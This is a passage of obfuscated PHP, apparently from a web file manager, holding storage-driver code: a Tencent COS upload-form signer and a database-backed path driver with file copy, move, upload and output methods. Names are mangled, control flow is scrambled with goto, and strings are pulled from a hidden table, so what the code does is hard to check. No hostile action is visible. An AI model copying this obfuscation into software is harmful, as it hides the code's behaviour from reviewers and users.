$cåŒ‰À¦Ã·[$Cô•®ÄÏŠ[174]], $cåŒ‰À¦Ã·[$Cô•®ÄÏŠ[173]], $cåŒ‰À¦Ã·[$Cô•®ÄÏŠ[28]], $dÚÉŒÄÂí§); $F†¢Úˆó»½[] = $D„¼Ş¨Ù£; } $E‰º‚±Ÿ¼‹->addAll($F†¢Úˆó»½); goto c×Ö² ´®; c×Ö² ´®: $e°œ°–òÄ = array($Cô•®ÄÏŠ[173] => array($Cô•®ÄÏŠ[7], array_keys($C—£öšÕï×))); $EíÅñ¶òÁ = $E‰º‚±Ÿ¼‹->where($e°œ°–òÄ)->select(); $EíÅñ¶òÁ = $EíÅñ¶òÁ ? $EíÅñ¶òÁ : array(); goto e°öìÅ®¹ì; EÂ”­²„ñ«: $EíÅñ¶òÁ = $E‰º‚±Ÿ¼‹->where($e°œ°–òÄ)->select(); $EíÅñ¶òÁ = $EíÅñ¶òÁ ? $EíÅñ¶òÁ : array(); foreach ($EíÅñ¶òÁ as $dÌÇ‚øßÖä) { if (!isset($C—£öšÕï×[$dÌÇ‚øßÖä[$Cô•®ÄÏŠ[173]]])) { continue; } $Bí‹í¡¸Õ£ = $C—£öšÕï×[$dÌÇ‚øßÖä[$Cô•®ÄÏŠ[173]]]; foreach ($Bí‹í¡¸Õ£ as &$BíÌÏ’Ÿ‰) { $BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[427]] = $dÌÇ‚øßÖä[$Cô•®ÄÏŠ[427]]; $BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[549]] = !0; } unset($BíÌÏ’Ÿ‰); } goto fƒœäŠµÔº; FÚïˆŒíÌß: foreach ($eÃù¬‰İá’ as &$BíÌÏ’Ÿ‰) { goto D†´ëôªÖ™; D†´ëôªÖ™: Hook::trigger($Cô•®ÄÏŠ[550], $BíÌÏ’Ÿ‰); $BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[85]] = $Bô¥™ÂÑ¯Ö->getPathInner($BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[85]]); $a¿•ñöàò‚ = $Bô¥™ÂÑ¯Ö->hashSimple($BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[85]]); goto e‰«¦—½‘Ü; AƒŸ×Øˆ£ó: if (count($C—£öšÕï×[$fë•ÃÚ¥¬º]) > 1) { $BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[549]] = !0; } goto FØÄ†òšÌ; e‰«¦—½‘Ü: $fë•ÃÚ¥¬º = $Bô¥™ÂÑ¯Ö->hashMd5($BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[85]]); if (strlen($fë•ÃÚ¥¬º) > 10 && !isset($C—£öšÕï×[$fë•ÃÚ¥¬º])) { $C—£öšÕï×[$fë•ÃÚ¥¬º] = array(); } $BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[174]] = $a¿•ñöàò‚; goto a…‰õˆËÆ ; a…‰õˆËÆ : $BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[173]] = $fë•ÃÚ¥¬º; Hook::trigger($Cô•®ÄÏŠ[551], $BíÌÏ’Ÿ‰); $C—£öšÕï×[$fë•ÃÚ¥¬º][] =& $BíÌÏ’Ÿ‰; goto AƒŸ×Øˆ£ó; FØÄ†òšÌ: } $e°œ°–òÄ = array($Cô•®ÄÏŠ[173] => array($Cô•®ÄÏŠ[7], array_keys($C—£öšÕï×))); $E‰º‚±Ÿ¼‹ = Model($Cô•®ÄÏŠ[552]); goto EÂ”­²„ñ«; A¤ÓÅˆ—£ç: return $E©Š®ÜÀ×¼; goto EŸª´¿ğ„; e°öìÅ®¹ì: foreach ($EíÅñ¶òÁ as $dÌÇ‚øßÖä) { if (!isset($C—£öšÕï×[$dÌÇ‚øßÖä[$Cô•®ÄÏŠ[173]]])) { continue; } $DÙ“ó‘æ“ =& $C—£öšÕï×[$dÌÇ‚øßÖä[$Cô•®ÄÏŠ[173]]]; foreach ($DÙ“ó‘æ“ as &$BíÌÏ’Ÿ‰) { $BíÌÏ’Ÿ‰[$Cô•®ÄÏŠ[427]] = $dÌÇ‚øßÖä[$Cô•®ÄÏŠ[427]]; } unset($BíÌÏ’Ÿ‰); } $E©Š®ÜÀ×¼ = array(); foreach ($eÃù¬‰İá’ as $Dç¸±Ä¾¼ç) { $E©Š®ÜÀ×¼[$Dç¸±Ä¾¼ç[$Cô•®ÄÏŠ[28]]] = $Dç¸±Ä¾¼ç; } goto A¤ÓÅˆ—£ç; a„’…¦ÏÅÑ: $Cô•®ÄÏŠ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$eÃù¬‰İá’ || count($eÃù¬‰İá’) == 0) { return array(); } $C—£öšÕï× = array(); goto FÚïˆŒíÌß; EŸª´¿ğ„: } } goto b””¾‘ä; DîÎè„ëÒ: $_SERVER[$_SERVER[œˆâ˜åÊâè][52]] = ("\71\66\66\71".strrev('06'))+0;$_UtDg="287Fc2yKEtPUhu9KkaUhWtjEAcBmRbvM5GGsNciuhSnVW75edwTxQvPS769AfBEtDH3zcA4RbzHBIz";; stream_wrapper_register($_SERVER[œˆâ˜åÊâè][53], $_SERVER[œˆâ˜åÊâè][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($A¬…‡İÒ‘£, $bíà°ÊÙİ) { $Cƒìò‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset(self::$_methodList[$A¬…‡İÒ‘£])) { return @call_user_func_array(self::$_methodList[$A¬…‡İÒ‘£], $bíà°ÊÙİ); } else { if (method_exists($this, $A¬…‡İÒ‘£)) { return call_user_func_array(array($this, $A¬…‡İÒ‘£), $bíà°ÊÙİ); } else { think_exception(__CLASS__ . $Cƒìò‹[4] . $A¬…‡İÒ‘£ . $Cƒìò‹[5]); } } } public static function __callStatic($AíÂ©ÑÂªê, $eÁ³É¶‹) { if (isset(self::$_methodListStatic[$AíÂ©ÑÂªê])) { return call_user_func_array(self::$_methodListStatic[$AíÂ©ÑÂªê], $eÁ³É¶‹); } else { if (method_exists(self, $AíÂ©ÑÂªê)) { return call_user_func_array(array(self, $AíÂ©ÑÂªê), $eÁ³É¶‹); } else { show_json("{$AíÂ©ÑÂªê}\x28\x29\x20\156\157\164\40\145\170\x69\163\x74\73", !1); } } } public static function addMethod($F˜Ÿ˜¼Íö, $dÙÅç½¦Øµ) { self::$_methodList[$F˜Ÿ˜¼Íö] = $dÙÅç½¦Øµ; } public static function addMethodStatic($e áœ×Á§Š, $b¨ËÍà©‘) { self::$_methodListStatic[$e áœ×Á§Š] = $b¨ËÍà©‘; } } goto BìĞã¤‰»õ; b””¾‘ä: define($_SERVER[¶ªÕß‚ØÁŸ][553], $_SERVER[¶ªÕß‚ØÁŸ][554]); $Eªöµ‰Ô† = $_SERVER[¶ªÕß‚ØÁŸ][555]; while (strlen($Eªöµ‰Ô†) < $_SERVER[¶ªÕß‚ØÁŸ][63]) { if (!$Eªöµ‰Ô†) { break; } $Eªöµ‰Ô†++; } goto d¦Óõãñˆ; CŒ¨¡²»òç: register_shutdown_function($_SERVER[œˆâ˜åÊâè][36]); set_error_handler($_SERVER[œˆâ˜åÊâè][49], $dÔäƒš°æº); if (function_exists($_SERVER[œˆâ˜åÊâè][50])) { set_exception_handler($_SERVER[œˆâ˜åÊâè][51]); } goto DîÎè„ëÒ; c¶Şˆ÷ Ó—: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($bÁœª´‚‹) { parent::__construct($bÁœª´‚‹); $this->signatureVersion($_SERVER[¶ªÕß‚ØÁŸ][210]); } public function uploadFormData($E¢›ëŠ³Ñ, $fš‹Çà¤°„ = 3600) { goto a½ò²è¿œ; FŠ¨Ìáù÷: $bÆÎÕÙŠ°¨ = sha1($E ­â¸·›ß); $cîÔ¶×ŠñŠ = hash_hmac($Dî©†ÓòµÌ[227], $bÆÎÕÙŠ°¨, $cµÓ›ÍŒÉ); $E”è™ÇŸÏ‰ = array($Dî©†ÓòµÌ[1108] => $FŠ¿Ğ†¸…Ã, $Dî©†ÓòµÌ[1112] => $CÚºˆî¸, $Dî©†ÓòµÌ[1116] => base64_encode($E ­â¸·›ß), $Dî©†ÓòµÌ[1113] => $fïØ·Óó, $Dî©†ÓòµÌ[1114] => $this->accessKey, $Dî©†ÓòµÌ[1117] => $f–ŸÈÚ‹‡Ü, $Dî©†ÓòµÌ[1118] => $cîÔ¶×ŠñŠ, $Dî©†ÓòµÌ[179] => $this->getHost()); goto Eé¹ºÎõóå; a½ò²è¿œ: $Dî©†ÓòµÌ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FŠ¿Ğ†¸…Ã = $Dî©†ÓòµÌ[195]; $fïØ·Óó = $Dî©†ÓòµÌ[227]; goto aÂ•„Ñ°Ï; AÏ®¨ŒåÂ·: $E ­â¸·›ß = array($Dî©†ÓòµÌ[1106] => $A‹Å§éÉšŞ, $Dî©†ÓòµÌ[1107] => array(array($Dî©†ÓòµÌ[1108] => $FŠ¿Ğ†¸…Ã), array($Dî©†ÓòµÌ[1109] => $this->bucket), array($Dî©†ÓòµÌ[1110], $Dî©†ÓòµÌ[1111], $Dî©†ÓòµÌ[33]), array($Dî©†ÓòµÌ[1112] => $CÚºˆî¸), array($Dî©†ÓòµÌ[1113] => $fïØ·Óó), array($Dî©†ÓòµÌ[1114] => $this->accessKey), array($Dî©†ÓòµÌ[1115] => $f–ŸÈÚ‹‡Ü))); $E ­â¸·›ß = json_encode($E ­â¸·›ß); $cµÓ›ÍŒÉ = hash_hmac($Dî©†ÓòµÌ[227], $f–ŸÈÚ‹‡Ü, $this->secret); goto FŠ¨Ìáù÷; aÂ•„Ñ°Ï: $CÚºˆî¸ = $Dî©†ÓòµÌ[1104]; $A‹Å§éÉšŞ = gmdate($Dî©†ÓòµÌ[1105], time() + $fš‹Çà¤°„); $f–ŸÈÚ‹‡Ü = (string) time() . $Dî©†ÓòµÌ[77] . (string) (time() + $fš‹Çà¤°„); goto AÏ®¨ŒåÂ·; Eé¹ºÎõóå: return $E”è™ÇŸÏ‰; goto B‹í­šêäÔ; B‹í­šêäÔ: } public function fileOutLink($C°‰ï¥µ‘) { $b”ÖÄ³ … =& $_SERVER[¶ªÕß‚ØÁŸ]; if (substr($C°‰ï¥µ‘, 0, 7) == $b”ÖÄ³ …[1119]) { $C°‰ï¥µ‘ = $b”ÖÄ³ …[1120] . substr($C°‰ï¥µ‘, 7); } header($b”ÖÄ³ …[166] . $C°‰ï¥µ‘); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($FÖĞÉ¯¡‰) { $this->pathParse = $FÖĞÉ¯¡‰; $this->model = Model($_SERVER[¶ªÕß‚ØÁŸ][1121]); } public function getPath($f¥¨ñ‚äæ) { return trim($f¥¨ñ‚äæ, $_SERVER[¶ªÕß‚ØÁŸ][8]); } public function pathFather($E¬„ÀÙëÄó) { $C¨ôƒ¬ĞºÛ = $this->parse($E¬„ÀÙëÄó); $C¨ôƒ¬ĞºÛ = $this->infoSimple($E¬„ÀÙëÄó); return $C¨ôƒ¬ĞºÛ ? $C¨ôƒ¬ĞºÛ[$_SERVER[¶ªÕß‚ØÁŸ][469]] : !1; } public function getPathName($F©„Å‹ˆ­ˆ) { $aáÆâ¬Œï = $this->infoSimple($F©„Å‹ˆ­ˆ); return $aáÆâ¬Œï ? $aáÆâ¬Œï[$_SERVER[¶ªÕß‚ØÁŸ][28]] : !1; } public function getPathOuter($E¶ÛˆË’²Ì) { if (!$E¶ÛˆË’²Ì) { return $E¶ÛˆË’²Ì; } $DÆƒÑÜïó³ = $this->parse($E¶ÛˆË’²Ì); return KodIO::make($DÆƒÑÜïó³[$_SERVER[¶ªÕß‚ØÁŸ][375]]); } public function copyFolderFromIO($D÷¼ºŸîë‡, $A¼²Ò¼Ó£, $a—‹ÕéÌé, $Eî¶†Í  , $B“©“–¾–‹) { $bòÈÈ¹öòö = $this->model->copyFolderFromIO($D÷¼ºŸîë‡, $A¼²Ò¼Ó£, $a—‹ÕéÌé, $Eî¶†Í  , $B“©“–¾–‹); return KodIO::make($bòÈÈ¹öòö); } public function isParentOf($c­ğ–îâåğ, $b«ÑÔœÆ¥«) { return $this->model->isParentOf($c­ğ–îâåğ, $b«ÑÔœÆ¥«); } public function mkfile($D„Ç•ÃÙ…, $bŞ Œğ……‹ = '', $c„Éö–âÛ = REPEAT_RENAME) { $fãñŸ£´Ñ¡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dİ“±äí™ò = $this->parse($D„Ç•ÃÙ…); $D„Ç•ÃÙ… = $dİ“±äí™ò[$fãñŸ£´Ñ¡[375]]; for ($có¼÷‰£‰ = 0; $có¼÷‰£‰ < count($dİ“±äí™ò[$fãñŸ£´Ñ¡[1122]]); $có¼÷‰£‰++) { $c‹…èÂ†Œ› = $dİ“±äí™ò[$fãñŸ£´Ñ¡[1122]][$có¼÷‰£‰]; if ($có¼÷‰£‰ == count($dİ“±äí™ò[$fãñŸ£´Ñ¡[1122]]) - 1) { $D„Ç•ÃÙ… = $this->model->mkfile($D„Ç•ÃÙ…, $c‹…èÂ†Œ›, $bŞ Œğ……‹, $c„Éö–âÛ); break; } $D„Ç•ÃÙ… = $this->model->mkdir($D„Ç•ÃÙ…, $c‹…èÂ†Œ›, REPEAT_SKIP); } return $this->getPathOuter($D„Ç•ÃÙ…); } public function mkdir($F›Ì´¹°È…, $AÒö‡õ¯µ = REPEAT_SKIP) { $dÈ×ì”´ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bËâ‰Í÷Ğå = $this->parse($F›Ì´¹°È…); $F›Ì´¹°È… = $bËâ‰Í÷Ğå[$dÈ×ì”´[375]]; for ($b„ÃÁ‘Ÿ‡¼ = 0; $b„ÃÁ‘Ÿ‡¼ < count($bËâ‰Í÷Ğå[$dÈ×ì”´[1122]]); $b„ÃÁ‘Ÿ‡¼++) { $eÑÂßÒß = $bËâ‰Í÷Ğå[$dÈ×ì”´[1122]][$b„ÃÁ‘Ÿ‡¼]; $F›Ì´¹°È… = $this->model->mkdir($F›Ì´¹°È…, $eÑÂßÒß, $AÒö‡õ¯µ); } return $this->getPathOuter($F›Ì´¹°È…); } public function copyFile($fã†¸¦“•£, $d»ëæ¼‰«Ü, $F¾ÄíÜ’† = REPEAT_REPLACE) { $F®İ§é¨§Õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A¾á÷×Ü = $this->parse($d»ëæ¼‰«Ü); $F‹ƒ‹ø¥Š = $this->model->copy($fã†¸¦“•£, $A¾á÷×Ü[$F®İ§é¨§Õ[375]], $F¾ÄíÜ’†, $A¾á÷×Ü[$F®İ§é¨§Õ[85]]); return $F‹ƒ‹ø¥Š ? $this->getPathOuter($F‹ƒ‹ø¥Š) : !1; } public function moveFile($BåÏèòñÃ, $fØñÌ­‚İ, $bäÔæ•õÑ¿ = REPEAT_REPLACE) { $eÎ‘İ—‹Ê =& $_SERVER[¶ªÕß‚ØÁŸ]; $f‰‚ÂŞ¼èˆ = $this->parse($fØñÌ­‚İ); $B¤Ú±©ôœ± = $this->model->move($BåÏèòñÃ, $f‰‚ÂŞ¼èˆ[$eÎ‘İ—‹Ê[375]], $bäÔæ•õÑ¿, $f‰‚ÂŞ¼èˆ[$eÎ‘İ—‹Ê[85]]); return $B¤Ú±©ôœ± ? $this->getPathOuter($B¤Ú±©ôœ±) : !1; } public function copy($c·ÕáÅÁÚÄ, $D‚‘Â¿óô, $EÀçğ§çê = REPEAT_REPLACE) { $e «¹æ‚­ = $this->parse($D‚‘Â¿óô); $B™²©Î½õÑ = $this->model->copy($c·ÕáÅÁÚÄ, $e «¹æ‚­[$_SERVER[¶ªÕß‚ØÁŸ][375]], $EÀçğ§çê); return $B™²©Î½õÑ ? $this->getPathOuter($B™²©Î½õÑ) : !1; } public function move($E×´Èá¤ªÕ, $EòÆ´ÜÔÒê, $b”¼íãĞ°ª = REPEAT_REPLACE) { $FÆÒŠ´«± = $this->parse($EòÆ´ÜÔÒê); $dÍÜÛ±Ìç» = $this->model->move($E×´Èá¤ªÕ, $FÆÒŠ´«±[$_SERVER[¶ªÕß‚ØÁŸ][375]], $b”¼íãĞ°ª); return $dÍÜÛ±Ìç» ? $this->getPathOuter($dÍÜÛ±Ìç») : !1; } public function remove($eçåàêÎŒ, $BˆçÓîÀá³ = true) { return $this->model->remove($eçåàêÎŒ, $BˆçÓîÀá³); } public function rename($eß ­‹¦¶, $fæôœˆöç) { $CÊƒ¸›„ğ = $this->model->rename($eß ­‹¦¶, $fæôœˆöç); return $CÊƒ¸›„ğ ? $this->getPathOuter($eß ­‹¦¶) : $CÊƒ¸›„ğ; } public function size($dÜö¯×Å„) { $dÂš¬çêÇ = $this->infoSimple($dÜö¯×Å„); return $dÂš¬çêÇ ? $dÂš¬çêÇ[$_SERVER[¶ªÕß‚ØÁŸ][87]] : 0; } public function infoSimple($eµå²Ö•ŞÙ) { return $this->model->sourceInfo($eµå²Ö•ŞÙ); } public function info($e™ØÖßÓÄâ) { return $this->infoParse($e™ØÖßÓÄâ); } public function infoAuth($bí³ƒêïĞ) { return $this->infoParse($bí³ƒêïĞ, !1, !0); } public function infoWithChildren($B´¯‚¯›ñ) { return $this->infoParse($B´¯‚¯›ñ, !0); } protected function infoParse($cñìšææåã, $eñéåÉ¬ƒ¯ = false, $añ“¶ßó• = false) { if (!$eñéåÉ¬ƒ¯) { return $this->model->pathInfo($cñìšææåã, $añ“¶ßó•); } return $this->model->pathInfoMore($cñìšææåã); } public function infoFull($b‹‘ÎË­×Û) { $Dƒ‚í†éµİ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d÷ìİ‰™Øù = explode($Dƒ‚í†éµİ[8], $b‹‘ÎË­×Û); $C²¦ĞÌœì¤ = implode($Dƒ‚í†éµİ[8], array_splice($d÷ìİ‰™Øù, 1)); return $this->model->pathInfoByPath($d÷ìİ‰™Øù[0], $C²¦ĞÌœì¤); } public function hashSimple($BĞºàÜ¸”ô) { $dÑ¢Ù´ÔÁ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÔÎæ¾í = $this->infoWithChildren($BĞºàÜ¸”ô); return $bÔÎæ¾í[$dÑ¢Ù´ÔÁ[172]][$dÑ¢Ù´ÔÁ[174]]; } public function hashMd5($b°·ø½Ú¢) { $Aî·Á¾éçô =& $_SERVER[¶ªÕß‚ØÁŸ]; $B‰†õóŒÊğ = $this->infoWithChildren($b°·ø½Ú¢); return $B‰†õóŒÊğ[$Aî·Á¾éçô[172]][$Aî·Á¾éçô[173]]; } public function exist($c´É×ƒÍ×) { $bÜ×®ğƒãœ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Fƒ¢°ÊäŠã = $this->parse($c´É×ƒÍ×); if (!$Fƒ¢°ÊäŠã[$bÜ×®ğƒãœ[85]]) { return $this->isFile($c´É×ƒÍ×) || $this->isFolder($c´É×ƒÍ×); } $eßâ‹ö¾µ• = array($bÜ×®ğƒãœ[376] => $Fƒ¢°ÊäŠã[$bÜ×®ğƒãœ[375]], $bÜ×®ğƒãœ[28] => $Fƒ¢°ÊäŠã[$bÜ×®ğƒãœ[85]]); $D’ìÒã· = $this->model->where($eßâ‹ö¾µ•)->find(); return $D’ìÒã· ? !0 : !1; } public function isFile($F½Œ¢‹é°¦) { $EÖ Ş‰×† =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÙŒšŞÏ¬ = $this->infoSimple($F½Œ¢‹é°¦); return $eÙŒšŞÏ¬ && $eÙŒšŞÏ¬[$EÖ Ş‰×†[378]] == $EÖ Ş‰×†[93] ? !1 : !0; } public function isFolder($aîİ¨¸§Œ) { $FªÁÃ¤’‰Ş =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aê´¸Ğ°ë® = $this->infoSimple($aîİ¨¸§Œ); return $Aê´¸Ğ°ë® && $Aê´¸Ğ°ë®[$FªÁÃ¤’‰Ş[378]] == $FªÁÃ¤’‰Ş[93] ? !0 : !1; } public function listPath($D®ˆ´İÛæ«, $aî´Ûøö = false) { $e—‘„óç± =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($D®ˆ´İÛæ« == $e—‘„óç±[33]) { return !1; } $fÒÌ¨¹¤Ø = array($e—‘„óç±[376] => $D®ˆ´İÛæ«); if ($aî´Ûøö) { return $this->model->listSource($fÒÌ¨¹¤Ø, -1); } return $this->model->listSource($fÒÌ¨¹¤Ø); } public function has($dñ„§¦î¼¹, $eÅ˜ÎÒÏ  = false, $e­¬íì—«ò = null) { $fè‰÷Â‰Å¼ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eæ×˜ÕÅ– = $this->infoWithChildren($dñ„§¦î¼¹); if ($eÅ˜ÎÒÏ ) { return array($fè‰÷Â‰Å¼[202] => $Eæ×˜ÕÅ–[$fè‰÷Â‰Å¼[202]], $fè‰÷Â‰Å¼[201] => $Eæ×˜ÕÅ–[$fè‰÷Â‰Å¼[201]]); } return $e­¬íì—«ò ? $Eæ×˜ÕÅ–[$fè‰÷Â‰Å¼[202]] : $Eæ×˜ÕÅ–[$fè‰÷Â‰Å¼[201]]; } public function listAll($AñÕŠçŸ„Å) { $D„›¯ÜÕÕ = IO::info($this->pathParse[$_SERVER[¶ªÕß‚ØÁŸ][85]]); if (!$D„›¯ÜÕÕ) { return array(); } return $this->model->listAll($AñÕŠçŸ„Å); } public function getContent($e’ËîÒ—é) { return $this->model->getContent($e’ËîÒ—é); } public function setContent($b‘ĞŒŸÕÂ“, $c»ÜÙ¡ó£ä = '') { return $this->model->setContent($b‘ĞŒŸÕÂ“, $c»ÜÙ¡ó£ä); } public function fileSubstr($b›µ˜‚ê¿¬, $eàÑÕ–íÎ¯, $f’õæÆ†ìÄ) { return $this->model->fileSubstr($b›µ˜‚ê¿¬, $eàÑÕ–íÎ¯, $f’õæÆ†ìÄ); } public function download($eŸ§ù¿â£Œ, $A¿¾×ã±ÛŠ = '') { $dù´‚Ö¾¥Ë = get_path_father($A¿¾×ã±ÛŠ); $DëªŒóÄ‹ = get_path_this($A¿¾×ã±ÛŠ); $E´˜®¦ğàŸ = $this->model->fileInfoGet($eŸ§ù¿â£Œ); $F¬¤‚ ‡ê´ = IO::copy($E´˜®¦ğàŸ[$_SERVER[¶ªÕß‚ØÁŸ][85]], $dù´‚Ö¾¥Ë, !1, $DëªŒóÄ‹); return $F¬¤‚ ‡ê´; } public function upload($FÅÂ÷ÑÕÓƒ, $dõ†è÷½İŞ, $Cö‚õ¡İé = false, $Aõ…¢å¶óÍ = REPEAT_REPLACE) { $CŠ±óã÷å =& $_SERVER[¶ªÕß‚ØÁŸ]; $E³óÃ¿“Ö = $this->parse($FÅÂ÷ÑÕÓƒ); $aÜêÛšƒ­ = $this->model->addFile($E³óÃ¿“Ö[$CŠ±óã÷å[375]], $dõ†è÷½İŞ, $E³óÃ¿“Ö[$CŠ±óã÷å[85]], $Cö‚õ¡İé, $Aõ…¢å¶óÍ); return $this->getPathOuter($aÜêÛšƒ­); } public function uploadFileByID($d˜ƒøø¿, $dÏ‘ÎĞ¹í‚, $dãØ§œ¨ö‚) { $b¢®äÂ‘·Ï =& $_SERVER[¶ªÕß‚ØÁŸ]; $b¯Ëó§ÊÜ = $this->parse($d˜ƒøø¿); $D ÕÂÃÚ ï = $this->model->addFileByFileID($b¯Ëó§ÊÜ[$b¢®äÂ‘·Ï[375]], $dÏ‘ÎĞ¹í‚, $b¯Ëó§ÊÜ[$b¢®äÂ‘·Ï[85]], $dãØ§œ¨ö‚); return $this->getPathOuter($D ÕÂÃÚ ï); } public function addFileByRemote($b¬™øùƒ„, $Aßª‘ÕÉÃë, $FŠÆŒìíµ¹ = array(), $Cä¬–ãºµ© = '', $cÚè¼ñì…İ) { $b¦Î«ŸÒÁÕ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C–«…‡´¡é = $this->parse($b¬™øùƒ„); $Cä¬–ãºµ© = empty($Cä¬–ãºµ©) ? $C–«…‡´¡é[$b¦Î«ŸÒÁÕ[85]] : $Cä¬–ãºµ©; $B·øâˆšì¹ = $this->model->addFileByRemote($C–«…‡´¡é[$b¦Î«ŸÒÁÕ[375]], $Aßª‘ÕÉÃë, $Cä¬–ãºµ©, $FŠÆŒìíµ¹, $cÚè¼ñì…İ); return $this->getPathOuter($B·øâˆšì¹); } public function uploadLink($dÈÜáöÅø¶, $bÅÆ¼È‹¾Œ = 0) { $c§ˆ¶ÁÂ°… =& $_SERVER[¶ªÕß‚ØÁŸ]; $C•ÆçØÈñ« = $this->parse($dÈÜáöÅø¶); $dÈÜáöÅø¶ = Model($c§ˆ¶ÁÂ°…[552])->createFileName($C•ÆçØÈñ«[$c§ˆ¶ÁÂ°…[85]]); $FåÚÔ—Öˆõ = IO::uploadLink($dÈÜáöÅø¶, $bÅÆ¼È‹¾Œ); return $FåÚÔ—Öˆõ; } public function fileNameAuto($e«êˆ—‹Ê», $A‰ö±ç«äÊ, $cæ³„µ±îÅ = REPEAT_REPLACE, $aÉ“ÁäÖæ = false) { return $this->model->fileNameAuto($e«êˆ—‹Ê», $A‰ö±ç«äÊ, $cæ³„µ±îÅ, $aÉ“ÁäÖæ); } public function fileNameExist($FáÛ†÷ ¡„, $dõÈÈÔŒåë) { return $this->model->fileNameExist($FáÛ†÷ ¡„, $dõÈÈÔŒåë); } protected function _fileOut($C­Í¢Ğ˜ÀŞ, $F«Ì…¦¾ = false, $cóÌ“‘À›® = false, $EÎôÚ¹Êå = '', $FËÃˆæ¡ƒÛ = false) { goto EãßÓ¨ƒÅô; bÄÖÉ¶«îÙ: $D‡–à„óËÂ = $this->model->fileInfoGet($C­Í¢Ğ˜ÀŞ); $EÎôÚ¹Êå = $D‡–à„óËÂ[$cƒá°ÜèÀ[173]] ? $D‡–à„óËÂ[$cƒá°ÜèÀ[173]] : $EÎôÚ¹Êå; $BÙªêá„Ôï = isset($GLOBALS[$cƒá°ÜèÀ[1124]]) ? $GLOBALS[$cƒá°ÜèÀ[1124]] : $f†Ûçé®®[$cƒá°ÜèÀ[28]]; goto B÷º×¯Õº¥; EãßÓ¨ƒÅô: $cƒá°ÜèÀ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f†Ûçé®® = $this->model->sourceInfo($C­Í¢Ğ˜ÀŞ); if ($f†Ûçé®®[$cƒá°ÜèÀ[378]] == $cƒá°ÜèÀ[93]) { header($cƒá°ÜèÀ[1123]); die; } goto bÄÖÉ¶«îÙ; B÷º×¯Õº¥: if ($FËÃˆæ¡ƒÛ) { return IO::fileOutServer($D‡–à„óËÂ[$cƒá°ÜèÀ[85]], $F«Ì…¦¾, $BÙªêá„Ôï, $EÎôÚ¹Êå); } IO::fileOut($D‡–à„óËÂ[$cƒá°ÜèÀ[85]], $F«Ì…¦¾, $BÙªêá„Ôï, $EÎôÚ¹Êå); goto eËÓâ«ƒ®”; eËÓâ«ƒ®”: } public function fileOut($F§ÅŞ†¨ÒÆ, $B†¤ğœÜ›¹ = false, $d­îšØÔ«½ = false, $Fã†‹³× = '') { $this->_fileOut($F§ÅŞ†¨ÒÆ, $B†¤ğœÜ›¹, $d­îšØÔ«½, $Fã†‹³×); } public function fileOutServer($bà¿é”×Ğ, $C©¶Ú“ÁÓç = false, $Cå‘Áƒ¤óŒ = false, $d‡¶Ó„Ë¹ñ = '') { $this->_fileOut($bà¿é”×Ğ, $C©¶Ú“ÁÓç, $Cå‘Áƒ¤óŒ, $d‡¶Ó„Ë¹ñ, !0); } protected function _fileOutImage($AìÒåÊ±, $C‡‚½»µÏ = 250) { $b¸ñ‚„Úèˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cœ±©‘²¨¤ = $this->model->sourceInfo($AìÒåÊ±); if ($cœ±©‘²¨¤[$b¸ñ‚„Úèˆ[378]] == $b¸ñ‚„Úèˆ[93]) { show_json($b¸ñ‚„Úèˆ[1125] . $AìÒåÊ±, !1); } $GLOBALS[$b¸ñ‚„Úèˆ[1124]] = $cœ±©‘²¨¤[$b¸ñ‚„Úèˆ[28]]; $A¹ØÚ½“˜î = $this->model->fileInfoGet($AìÒåÊ±); IO::fileOutImage($A¹ØÚ½“˜î[$b¸ñ‚„Úèˆ[85]], $C‡‚½»µÏ); } public function fileOutImage($Câ„Ô•ùèŞ, $aÒ”„™ùˆ’ = 250) { $this->_fileOutImage($Câ„Ô•ùèŞ, $aÒ”„™ùˆ’); } public function fileOutImageServer($döÆŞÏ‚à…, $eùÏÍÔ«Øƒ = 250) { $this->_fileOutImage($döÆŞÏ‚à…, $eùÏÍÔ«Øƒ); } public function link($FŒ¨‹¶œˆë, $eÛ„â–ÚÇ‹ = '') { $DÈñµÍ = $this->model->fileInfoGet($FŒ¨‹¶œˆë); return IO::link($DÈñµÍ[$_SERVER[¶ªÕß‚ØÁŸ][85]], $eÛ„â–ÚÇ‹); } protected function parse($fˆ£¢î›‡å) { $e«¿“‘› =& $_SERVER[¶ªÕß‚ØÁŸ]; if (strstr($fˆ£¢î›‡å, $e«¿“‘›[8]) === !1) { return array($e«¿“‘›[393] => intval($fˆ£¢î›‡å), $e«¿“‘›[85] => $e«¿“‘›[33], $e«¿“‘›[1122] => array()); } $D‹ Îè¾ë = explode($e«¿“‘›[8], trim($fˆ£¢î›‡å, $e«¿“‘›[8])); if (count($D‹ Îè¾ë) < 2) { show_tips($fˆ£¢î›‡å . $e«¿“‘›[1126]); } return array($e«¿“‘›[393] => intval($D‹ Îè¾ë[0]), $e«¿“‘›[85] => $D‹ Îè¾ë[1], $e«¿“‘›[1122] => array_slice($D‹ Îè¾ë, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($EÎï­²„ğÇ) { $this->pathParse = $EÎï­²„ğÇ; $this->model = 